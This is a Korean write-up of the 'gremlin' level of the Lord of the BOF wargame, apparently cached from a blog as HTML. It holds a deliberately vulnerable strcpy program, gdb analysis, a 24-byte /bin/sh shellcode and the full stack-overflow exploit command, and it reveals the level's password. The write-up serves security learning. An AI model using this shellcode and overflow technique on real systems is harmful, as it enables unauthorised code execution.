@@ -1,0 +1,125 @@
+I"�%<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: gate
+Password:
+Last login: Sat Feb 27 11:04:23 on tty1
+<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">ls
+</span>gremlin  gremlin.c
+<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cat </span>gremlin.c
+/<span class="k">*</span>
+        The Lord of the BOF : The Fellowship of the BOF
+        - gremlin
+        - simple BOF
+<span class="k">*</span>/
+
+int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
+<span class="o">{</span>
+    char buffer[256]<span class="p">;</span>
+    <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+    strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>gate/gate로 로그인하자.
+해킹할 프로그램의 소스 파일을 주었으므로 읽어왔다.
+strcpy를 하며 버퍼오버플로우가 일어난다.
+LOB에서는 환경변수를 가능하면 사용하지 않겠다.</p>
+
+<p>우선 소스 파일을 복사해 컴파일하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">mkdir </span>tmp
+<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cp </span>gremlin.c tmp
+<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cd </span>tmp
+<span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span><span class="nb">ls
+</span>gremlin.c
+<span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> gremlin gremlin.c
+</code></pre></div></div>
+<p>LOB는 bash2라는 명령어를 친 후에 풀어야 한다고 한다.
+또한 낮은 버전의 gcc 컴파일러를 사용하기 때문에 컴파일을 해도 더미가 생기지 않는다. 그러므로 소스만 보아도 RET까지의 위치를 알 수 있다.
+위를 예로 들면 SFT까지는 256+4=260, RET까지는 260+4=264.
+정말 계산이 간단해진다.
+환경 변수를 사용하면 금방 풀겠지만 아까 말했듯 환경변수는 사용을 자제하겠다.
+그러므로 gdb를 통해 풀자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> gremlin
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+0x8048430 &lt;main&gt;:       push   %ebp
+0x8048431 &lt;main+1&gt;:     mov    %ebp,%esp
+0x8048433 &lt;main+3&gt;:     sub    %esp,0x100
+0x8048439 &lt;main+9&gt;:     cmp    DWORD PTR <span class="o">[</span>%ebp+8],1
+0x804843d &lt;main+13&gt;:    jg     0x8048456 &lt;main+38&gt;
+0x804843f &lt;main+15&gt;:    push   0x80484e0
+0x8048444 &lt;main+20&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x8048449 &lt;main+25&gt;:    add    %esp,4
+0x804844c &lt;main+28&gt;:    push   0
+0x804844e &lt;main+30&gt;:    call   0x8048360 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
+0x8048453 &lt;main+35&gt;:    add    %esp,4
+0x8048456 &lt;main+38&gt;:    mov    %eax,DWORD PTR <span class="o">[</span>%ebp+12]
+0x8048459 &lt;main+41&gt;:    add    %eax,4
+0x804845c &lt;main+44&gt;:    mov    %edx,DWORD PTR <span class="o">[</span>%eax]
+0x804845e &lt;main+46&gt;:    push   %edx
+0x804845f &lt;main+47&gt;:    lea    %eax,[%ebp-256]
+0x8048465 &lt;main+53&gt;:    push   %eax
+0x8048466 &lt;main+54&gt;:    call   0x8048370 &lt;strcpy&gt;
+0x804846b &lt;main+59&gt;:    add    %esp,8
+0x804846e &lt;main+62&gt;:    lea    %eax,[%ebp-256]
+0x8048474 &lt;main+68&gt;:    push   %eax
+0x8048475 &lt;main+69&gt;:    push   0x80484ec
+0x804847a &lt;main+74&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x804847f &lt;main+79&gt;:    add    %esp,8
+0x8048482 &lt;main+82&gt;:    leave
+0x8048483 &lt;main+83&gt;:    ret
+</code></pre></div></div>
+<p>strcpy가 main+54에서 일어나므로 그 뒤쪽에 break를 걸자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+59
+Breakpoint 1 at 0x804846b
+<span class="o">(</span>gdb<span class="o">)</span> 
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*260+"BBBB"'</span><span class="si">)</span>
+Starting program: /home/gate/tmp/gremlin <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*260+"BBBB"'</span><span class="si">)</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+<span class="o">(</span>gdb<span class="o">)</span>Breakpoint 1, 0x804846b <span class="k">in </span>main <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/500x <span class="nv">$esp</span>
+0xbffff900:     0xbffff908      0xbffffb64      0x41414141      0x41414141
+0xbffff910:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff920:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff930:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff940:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff950:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff960:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff970:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff980:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff990:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff9a0:     0x41414141      0x41414141      0x41414141      0x41414141
+......
+0xbffffb60:     0x006e696c      0x41414141      0x41414141      0x41414141
+0xbffffb70:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb80:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb90:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffba0:     0x41414141      0x41414141      0x41414141      0x41414141
+</code></pre></div></div>
+<p>다른 풀이를 보면 입력을 받아 가장 위에 보이는 입력되는 주소를 RET에 덮어쓴다. 그러나 나는 입력이 저 밑에 하나가 더 생긴다.
+그래서 밑에 생긴 입력 주소를 RET로 넘겨야 풀린다.
+(삭제-설치 테크도 실패)
+왜 입력이 두번 되는건지 알면 hello111353@gmail.com으로 메일 부탁한다ㅠㅠ
+(구걸할 정도로 궁금하다)
+아무튼, 입력이 시작되는 주소는 bffffb60이므로 그 밑줄의 주소, 즉 bffffb70을 RET로 덮어쓰자.
+24byte의 쉘 코드를 사용했다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
+</code></pre></div></div>
+<p>환경변수를 쓰지 않는다고 해도 쉘 코드는 사용한다!
+gremlin+SFT=260 (256+4)
+이므로 쉘코드와 nop으로 260개를 채워야 한다.
+그 뒤에 RET에 덮어쓸 주소를 넣자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gremlin <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*236+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x70\xfb\xff\xbf"'</span><span class="si">)</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1픐h//shh/bin됥PS됣솻
+                 ?p??
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 501
+hello bof world
+</code></pre></div></div>
+<p>성공했다.
+gate’s password : hello bof world</p>
+
+:ET
